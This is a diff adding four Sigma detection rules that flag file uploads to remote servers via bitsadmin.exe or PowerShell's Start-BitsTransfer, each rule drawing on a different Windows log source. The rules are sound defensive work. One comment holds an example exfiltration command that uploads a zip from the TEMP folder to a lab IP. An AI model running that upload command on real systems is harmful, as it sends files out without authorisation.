@@ -1,0 +1,140 @@
+title: Bitsadmin-FileUpload
+status: Stable
+description: Detect usage of BITS Commandlets and bitsadmin.exe to upload files to a remote server through Powershell Operational logs.
+tags:
+    - attack.Command and Control
+    - attack.T1105
+    - S0190
+    
+date: 2022/05/12
+author: CyberCastle [Assem Morad]
+id: ab9d8ec1-91df-4b63-b2c5-11af7600d0c6
+logsource:
+    product: windows
+    service: powershellOperational
+detection:
+    PS_Operational:
+        EventID: 4104
+        
+    PS_ScriptBlock1:
+        ScriptBlock|contains:
+            - 'bitsadmin'        
+            - 'Start-BitsTransfer'
+         
+    PS_ScriptBlock2:
+        ScriptBlock|contains:
+            - '-TransferType'
+            - '/CREATE' 
+            - '/TRANSFER'            
+            
+    PS_ScriptBlock3:
+        ScriptBlock|contains:
+            - 'Upload'
+                   
+    condition: PS_Operational and PS_ScriptBlock1 and (PS_ScriptBlock2 or PS_ScriptBlock3)
+falsepositives: Legitimate BITS usage
+level: high
+---
+title: Bitsadmin-FileUpload
+status: Stable
+description: Detect usage of bitsadmin.exe to upload files to a remote server through Sysmon events.
+tags:
+    - attack.Command and Control
+    - attack.T1105
+    - S0190
+    
+date: 2022/05/12
+author: CyberCastle [Assem Morad]
+id: aa41099c-fe2c-4d3f-9d16-97d07c2935e
+logsource:          #Start-BitsTransfer -TransferType Upload -Source "$env:TEMP/Part1.zip" -Destination "http://192.168.44.128/test/Part1.zip"
+    product: windows
+    service: sysmon
+    definition:
+        - SysmonModular rules containes default rules that will generate the required logs for this rule
+        - those events could be mapped to any EDR equivelent events.  
+detection:
+    ProcessCreation:
+        EventID: 1 
+        FileOriginalName: 
+            - 'bitsadmin.exe'
+            - 'powershell.exe'
+        CommandLine|contains:           
+            - '/TRANSFER'
+            - '/CREATE'
+            - 'Start-BitsTransfer'
+    Sec_Cmd:
+        CommandLine|contains:
+            - 'UPLOAD'
+             
+    condition: ProcessCreation and Sec_Cmd
+falsepositives: Legitimate BITS usage
+level: high
+---
+title: Bitsadmin-FileUpload
+status: Stable
+description: Detect usage of bitsadmin.exe to upload files to a remote server through Security Logs.
+tags:
+    - attack.Command and Control
+    - attack.T1105
+    - S0190
+    
+date: 2022/05/12
+author: CyberCastle [Assem Morad]
+id: b5704722-a6b6-4267-bc81-2bcd3c323c6f
+
+logsource:
+    product: windows
+    service: security
+detection:
+    ProcessCreation:
+        EventID: 4688
+        ProcessName: 
+            - 'bitsadmin.exe' 
+            - 'powershell.exe'            
+        CommandLine|contains:
+            - '/TRANSFER'
+            - '/CREATE'
+            - 'Start-BitsTransfer'            
+    Sys_Cmd:
+        CommandLine|contains:
+            - 'UPLOAD'
+            
+    condition: ProcessCreation and Sys_Cmd
+falsepositives: Legitimate BITS usage
+level: high
+---
+title: Bitsadmin-FileUpload
+status: Stable
+description: Detect usage of bitsadmin to upload files to a remote server via Windows Powershell events.
+tags:
+    - attack.Command and Control
+    - attack.T1105
+    - S0190
+    
+date: 2022/05/12
+author: CyberCastle [Assem Morad]
+id: 3cab401c-e327-49d1-8b22-483dded2f920
+
+logsource:
+    product: windows
+    service: powershell
+detection:
+    Win_PS:
+        EventID: 400
+        HostApplication|contains|all: 
+            - 'bitsadmin'
+            - 'Start-BitsTransfer'
+    PS_HostApp1:
+        HostApplication|contains:
+            - '/TRANSFER'
+            - '/CREATE'
+            - '-TransferType'
+    PS_HostApp2:
+        HostApplication|contains:
+            - 'Upload'
+    
+    condition: Win_PS and PS_HostApp1 and PS_HostApp2
+falsepositives: Legitimate BITS usage
+level: high
+
+ 
